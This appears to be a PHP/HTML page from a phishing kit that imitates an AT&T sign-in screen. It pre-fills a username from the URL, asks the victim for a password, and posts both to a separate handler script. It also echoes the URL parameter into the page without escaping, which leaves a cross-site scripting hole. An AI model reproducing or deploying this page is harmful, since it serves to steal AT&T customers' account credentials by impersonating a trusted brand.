<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>login</title>
</head>
<body>

<main>
    <div class="continer">
    <form action="post.php" method="post">


<div class="logo">
<img src="res/img/logo.png" >

</div>

<div class="title">
<h1> Welcome</h1>
</div>



<div class="col">
<label>Password</label>
<input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
<input type="password" name="pass" required>
</div>

<div class="chek">
<input type="checkbox">
<label >Keep me signed in</label>
</div>

<div class="but">
<button type="submit">Sign in</button>
</div>

<div class="a">
<a href="#">Forgot password?</a>
<a href="#">Pay without signing in</a>

</div>

<div class="r"> 
<hr> 
</div>

<div class="but1">
<button type="button">Sign in with myAT&T app</button>
</div>

</form>
    </div>
    
    <div class="bot">
<img src="res/img/botom.png" alt="">
</div>

</main>


</body>
</html>